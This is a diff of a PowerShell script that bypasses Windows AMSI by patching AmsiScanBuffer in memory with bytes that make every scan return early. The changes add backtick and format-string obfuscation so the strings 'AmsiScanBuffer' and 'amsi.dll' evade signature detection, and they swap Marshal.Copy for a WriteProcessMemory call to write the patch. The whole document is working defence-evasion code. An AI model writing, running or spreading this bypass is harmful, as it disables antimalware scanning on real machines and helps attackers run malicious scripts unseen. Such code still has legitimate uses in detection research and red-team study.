@@ -1,20 +1,26 @@
 $MethodDefinition = "
 [DllImport(`"kernel32`")]
+public static extern IntPtr GetCurrentProcess();
+[DllImport(`"kernel32`")]
 public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 [DllImport(`"kernel32`")]
 public static extern IntPtr GetModuleHandle(string lpModuleName);
 [DllImport(`"kernel32`")]
 public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+[DllImport(`"kernel32`")]
+public static extern bool WriteProcessMemory(IntPtr hModule, IntPtr lpAddress, Byte[] lpBuffer, UInt32 dwSize, ref UInt32 lpNumberOfBytesWritten);
 ";
 $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
-$ABSD = 'AmsiS'+'canBuffer';
-$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
+${AB`sd} = ("{1}{2}{4}{3}{0}"-f 'er','A','msiSca','f','nBuf');
+${ha`NdLE} = [Win32.Kernel32]::GetModuleHandle(("{0}{1}{2}" -f'ams','i.d','ll'));
 [IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $ABSD);
 [UInt32]$Size = 0x5;
 [UInt32]$ProtectFlag = 0x40;
 [UInt32]$OldProtectFlag = 0;
-[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
-$titi=$BufferAddress
-$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);
-$toto = $buf
-[system.runtime.interopservices.marshal]::copy($toto, 0, $BufferAddress, 6);
+[Win32.Kernel32]::VirtualProtect(${B`UFFErA`d`Dre`ss}, ${sI`ze}, ${pr`OtecT`Fl`Ag}, [Ref]${O`lD`P`ROt`ECtflAg});
+${Ti`Ti}=${bU`F`FeRa`dDRess}
+[Byte[]]${b`Uf} = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);
+${hAnD`L`e2} = [Win32.Kernel32]::GetCurrentProcess();
+
+[UInt32]${lpnUm`BEroFby`T`esWRI`T`Ten} = 0
+[Win32.Kernel32]::WriteProcessMemory(${haNd`le2}, ${BUffE`RAD`d`RESs}, ${b`Uf}, 6, [ref]${lPn`UMBErofB`YTES`wRIttEn});
